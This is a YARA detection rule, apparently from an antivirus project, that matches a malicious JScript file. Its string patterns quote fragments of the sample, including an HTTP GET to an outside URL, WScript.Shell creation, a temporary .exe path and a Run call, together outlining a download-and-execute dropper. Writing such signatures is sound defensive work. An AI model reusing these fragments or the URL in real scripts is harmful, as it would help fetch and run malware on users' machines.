rule sig_20160330_4f9e1b63ef425f57f854543e71d09f50 {
  meta:
    description = "datamaliciousorder - file 20160330_4f9e1b63ef425f57f854543e71d09f50.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5319942755fec2ea7750a3d0ec48beeb1077b9b091f06c73363d1a7bfc20c8dc"

  strings:
    $s1  = "function _XP(_W, _JX){_G = _G * 1; return _W - _JX;};" fullword ascii
    $s2  = "_DG[_JQ](\"GET\", \"http://goldish.dk/o2pds\", false);" fullword ascii
    $s3  = "var _S = function _ZC() {return WScript[_ES](\"WScript\"+\".Shell\");}(), _D = 11;" fullword ascii
    $s4  = "if (_DG[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _K() {return _S[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"zJCVBLwSgbY2Rr.ex\" + \"e\";};" fullword ascii
    $s6  = "function _A(){return _CT + \"\";};" fullword ascii
    $s7  = "function _U() {return ((_V0 == true) && (_V0 == _O0)) ? 1 : _G;};" fullword ascii
    $s8  = "function _H(_K0){_S[\"Run\"](_K0, _G, _G);};" fullword ascii
    $s9  = " while (_O){" fullword ascii
    $s10 = "function _WJ(){return 22;};" fullword ascii
    $s11 = "return _XP(_CC, _N);" fullword ascii
    $s12 = "function _UG(_PU) {var _M = (1, 2, 3, 4, 5, _PU); return _M;};" fullword ascii
    $s13 = "var _FE = new this[\"Date\"]();" fullword ascii
    $s14 = "function _HZ()" fullword ascii
    $s15 = "function _XR(){return _ES;};" fullword ascii
    $s16 = "var _A0 = false;" fullword ascii
    $s17 = "var _O0 = false;" fullword ascii
    $s18 = "var _V0 = false;" fullword ascii
    $s19 = "_V0 = true; " fullword ascii
    $s20 = "_O0 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}